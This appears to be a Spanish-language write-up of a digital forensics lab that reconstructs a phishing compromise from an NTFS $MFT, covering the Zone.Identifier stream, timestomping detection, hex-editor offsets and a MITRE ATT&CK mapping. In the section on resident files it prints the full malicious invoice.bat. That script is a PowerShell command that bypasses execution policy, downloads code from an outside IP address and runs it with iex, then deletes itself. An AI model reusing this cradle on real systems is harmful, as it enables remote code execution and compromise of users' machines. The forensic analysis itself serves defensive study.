# 🕵️ Análisis de Incidente: Sherlock - BFT ($MFT Investigation)

## 📌 Descripción del Caso
Este laboratorio se enfoca en aprender a analizar la **Master File Table ($MFT)** en un sistema de archivos NTFS para investigar un compromiso de endpoint. El escenario recrea un ataque donde un usuario descargó un archivo comprimido malicioso a través de ingeniería social. Como para este caso no teníamos logs tradicionales del sistema operativo, el objetivo fue reconstruir los pasos del atacante analizando directamente los metadatos de la `$MFT`.

## 🛡️ Resumen Ejecutivo
Analizando la `$MFT`, pude confirmar que el vector de ataque ingresó mediante la descarga de un archivo comprimido (`Stage-20240213T093324Z-001.zip`). Al extraerlo, se ejecutó un script malicioso llamado `invoice.bat`. El atacante intentó ocultar este script modificando sus fechas de creación (*Time Stomping*). Al ser un archivo de texto muy chico, su contenido quedó guardado como un **archivo residente** dentro de la propia `$MFT`. Esto me permitió extraer el código directamente sin necesidad de recuperar el archivo borrado, descubriendo un comando de PowerShell que conectaba a un servidor de Comando y Control (C2) externo.

## 🛠️ Metodología de Análisis
Para resolver este caso, utilicé herramientas de análisis forense digital como **MFTECmd** (para parsear la tabla y hacerla legible), **Timeline Explorer** (para filtrar los datos de forma lógica) y el editor hexadecimal **HxD** (para buscar los bytes reales en el binario).

### 1. Identificación del Vector Inicial y Flujos de Datos Alternativos (ADS)
Empecé rastreando desde dónde se descargó el archivo sospechoso. En NTFS, cuando bajamos algo de internet, Windows le agrega un identificador de zona. Revisando este metadato (Alternate Data Stream):
* **Atributo Revisado:** `Zone.Identifier`
* **Origen:** Confirmé un valor de `ZoneId=3`, lo que demuestra que el archivo vino de la Web.
* **Ruta de la descarga:** `C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices.zip`

### 2. Detección de Técnicas de Evasión: Manipulación de Tiempos (Time Stomping)
El atacante intentó camuflar el script `invoice.bat` cambiando sus fechas para que parezca un archivo viejo y legítimo. Para detectar esta trampa, hice un cruce lógico entre las dos marcas de tiempo que guarda NTFS:
* **Filtro Aplicado:** Comparé el atributo `$STANDARD_INFORMATION` (que el usuario o un script pueden modificar fácilmente) contra el atributo `$FILE_NAME` (que solo lo modifica el sistema operativo, aplicando la regla del bit `0x30`).
* **Resultado:** Al ver que las fechas no coincidían, quedó en evidencia el *Timestomping* y pude ver la fecha real en la que se creó el archivo malicioso.

### 3. Localización y Offset en el Editor Hexadecimal
Con los datos de la tabla organizada, vi que el archivo de persistencia estaba en el número de registro MFT **23436**. Para ver el contenido en bruto:
* **Herramienta Usada:** Editor Hexadecimal HxD.
* **Posición:** Salté directamente al offset `0x16E3000`.
* En esa posición binaria encontré el nombre del archivo en texto claro (`i.n.v.o.i.c.e...b.a.t.`), lo que me confirmó que estaba parado en el registro correcto.

### 4. Análisis de Archivos Residentes y Extracción del C2
Como el archivo `invoice.bat` pesaba muy pocos bytes, el sistema NTFS optimizó espacio guardando su contenido directamente dentro del atributo `$DATA` del registro. Esto lo convirtió en un **archivo residente**.

Buscando cadenas de texto dentro de HxD, logré extraer el código plano del script malicioso:

> **Script Extraído:**
> `@echo off`
> `start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://43.204.110.203:6666/download/powershell/Om1hdHRpZmVzdGFuIGV0dw==') -UseBasicParsing|iex"`
> `(goto) 2>nul & del "%~f0"`

El script usaba PowerShell para saltarse las políticas de ejecución (`-ep bypass`) y hacía una petición web (`iwr`) para conectarse hacia afuera.

* **Dirección IP del C2:** `43.204.110.203`
* **Puerto:** `6666`

## 📊 Mapeo de Técnicas (MITRE ATT&CK)
* **T1566.001 - Phishing (Spearphishing Attachment):** Se engañó al usuario para descargar el archivo comprimido malicioso.
* **T1070.006 - Indicator Removal (Timestomp):** Modificación del atributo `$STANDARD_INFORMATION` para cambiar las fechas de `invoice.bat` y evadir la detección por antigüedad.
* **T1059.001 - Command and Scripting Interpreter (PowerShell):** Uso de comandos de PowerShell para conectarse a la red y descargar código de forma oculta.
* **T1027.001 - Obfuscated Files or Information (Binary Padding):** Aprovechamiento de los atributos residentes de la MFT para esconder el script dentro de los metadatos del sistema de archivos.
